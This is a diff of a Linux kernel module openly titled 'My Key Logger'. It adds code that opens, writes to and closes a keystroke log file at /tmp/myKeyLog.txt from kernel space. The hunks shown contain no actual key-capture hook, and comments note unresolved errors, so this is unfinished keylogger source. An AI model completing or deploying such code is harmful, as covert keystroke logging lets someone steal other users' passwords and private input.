@@ -5,16 +5,26 @@
 /////////////
 /* HEADERS */
 /////////////
+// Do not change the order of these includes unless you want:
+// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
+#include <asm/current.h>                        // current
+#include <linux/cred.h>                         // ???
+
+#include <asm/uaccess.h>                        // get_fs(), set_fs()
+#include "HarkleKerror.h"                       // Kernel error macros
+#include <linux/fcntl.h>                        // filp_open(), filp_close()
+#include <linux/fs.h>                           // Defines file table structures
 #include <linux/kernel.h>                       // ALWAYS NEED
 #include <linux/module.h>                       // ALWAYS NEED
+#include <linux/stat.h>                         // File mode macros
 
 ////////////
 /* MACROS */
 ////////////
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
-#define HARKLE_KERROR(module, funcName, errMsg) do { printk(KERN_ERR "%s: <<<ERROR>>> %s - %s\n", module, #funcName, errMsg); } while (0);
-#define HARKLE_KERRNO(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
-#define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
+// #define HARKLE_KERROR(module, funcName, errMsg) do { printk(KERN_ERR "%s: <<<ERROR>>> %s - %s\n", module, #funcName, errMsg); } while (0);
+// #define HARKLE_KERRNO(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
+// #define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
 #define BUFF_SIZE 16                           // Size of the out buffer
 #ifndef TRUE
 #define TRUE 1
@@ -22,12 +32,18 @@
 #ifndef FALSE
 #define FALSE 0
 #endif  // FALSE
+#define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
+#define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
+// #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
+#define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
 
 //////////////
 /* TYPEDEFS */
 //////////////
 typedef struct _myKeyLogger
 {
+    struct file *log_fp;
+    loff_t logOffset;
     char keyStr[BUFF_SIZE + 1];
 } myKeyLogger, *myKeyLogger_ptr;
 
@@ -38,6 +54,10 @@ typedef struct _myKeyLogger
 static int __init key_logger_init(void);
 // PURPOSE - LKM exit function
 static void __exit key_logger_exit(void);
+// PURPOSE - Return a file pointer to fileName_ptr with given flags and permissions
+static struct file* open_log(const char *fileName_ptr, int flags, int rights);
+// PURPOSE - Close a file pointer
+static void close_log(struct file *logFile_fp);
 // PURPOSE - Translate scan code to 'key' string
 // RETURN - 0 on success, -1 on failure
 static int translate_code(unsigned char scanCode, char *buf);
@@ -47,6 +67,7 @@ static int translate_code(unsigned char scanCode, char *buf);
 /////////////
 myKeyLogger myKL;
 int shift;
+// struct task_struct;
 
 //////////////////////////
 /* FUNCTION DEFINITIONS */
@@ -54,20 +75,41 @@ int shift;
 static int __init key_logger_init(void)
 {
     int retVal = 0;
-    unsigned char i = 0;  // DEBUGGING
+    // unsigned char i = 0;  // DEBUGGING
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING
 
     // Initialize Globals
     // 1. Initialize myKeyLogger struct
+    myKL.log_fp = NULL;
+    myKL.logOffset = 0;
     memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
     // 2. shift
     shift = FALSE;
 
     // DEBUGGING
-    for (i = 0; i <= 85; i++)
+    // for (i = 0; i <= 85; i++)
+    // {
+    //     translate_code(i, myKL.keyStr);
+    // }
+
+    // Prepare Key Logging File
+    myKL.log_fp = open_log(DEF_LOG_FILENAME, DEF_LOG_FLAGS, DEF_LOG_PERMS);
+
+    if (!(myKL.log_fp))
     {
-        translate_code(i, myKL.keyStr);
+        retVal = -1;
+        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() Failed");  // DEBUGGING
+    }
+    
+    else
+    {
+        HARKLE_KINFO(DEVICE_NAME, "File opened");  // DEBUGGING
+
+        // NOTE: Getting errors here.  Work on making the logger append to the file later.
+        // http://www.ouah.org/mammon_kernel-mode_read_hack.txt
+        // myKL.logOffset = myKL.log_fp->f_pos;
+        // printk(KERN_INFO "%s: File offset of %s is %ld\n", DEVICE_NAME, DEF_LOG_FILENAME, myKL.logOffset);  // DEBUGGING
     }
     
     // DONE
@@ -78,10 +120,75 @@ static int __init key_logger_init(void)
 static void __exit key_logger_exit(void)
 {
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
-    // Code here
+    // Close Key Logging File
+    if (myKL.log_fp)
+    {
+        close_log(myKL.log_fp);
+        myKL.log_fp = NULL;
+        HARKLE_KINFO(DEVICE_NAME, "File closed");  // DEBUGGING
+    }
+    else
+    {
+        HARKLE_KWARNG(DEVICE_NAME, key_logger_exit, "Logging file pointer was NULL");  // DEBUGGING
+    }
     
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
+    return;
+}
+
+static struct file* open_log(const char *fileName_ptr, int flags, int rights)
+{
+    struct file *retVal = NULL;
+    mm_segment_t old_fs = get_fs();  // Store the original process address space specification
+
+    // INPUT VALIDATION
+    if (!fileName_ptr)
+    {
+        HARKLE_KERROR(DEVICE_NAME, open_log, "NULL Pointer");  // DEBUGGING
+    }
+    else if (!(*fileName_ptr))
+    {
+        HARKLE_KERROR(DEVICE_NAME, open_log, "Empty string");  // DEBUGGING
+    }
+    else if (O_RDONLY != flags && !(flags & (O_WRONLY | O_RDWR)))
+    {
+        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid flags");  // DEBUGGING
+    }
+    else if (!rights)
+    {
+        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid permissions");  // DEBUGGING
+    }
+    else
+    {
+        // OPEN FILE
+        // 1. Change to kernel process address space
+        // set_fs(KERNEL_DS);  // I've seen this but...
+        set_fs(get_ds());  // ...the majority wins
+
+        // 2. Open the file
+        retVal = filp_open(fileName_ptr, flags, rights);
+
+        // 3. Restore the address specification (regardless of success)
+        set_fs(old_fs);
+
+        if (IS_ERR(retVal))
+        {
+            HARKLE_KERRNO(DEVICE_NAME, open_log, (int)PTR_ERR(retVal));
+            retVal = NULL;
+        }
+    }
+
+    return retVal;
+}
+
+static void close_log(struct file *logFile_fp)
+{
+    if (logFile_fp)
+    {
+        filp_close(logFile_fp, NULL);
+    }
+
     return;
 }
 
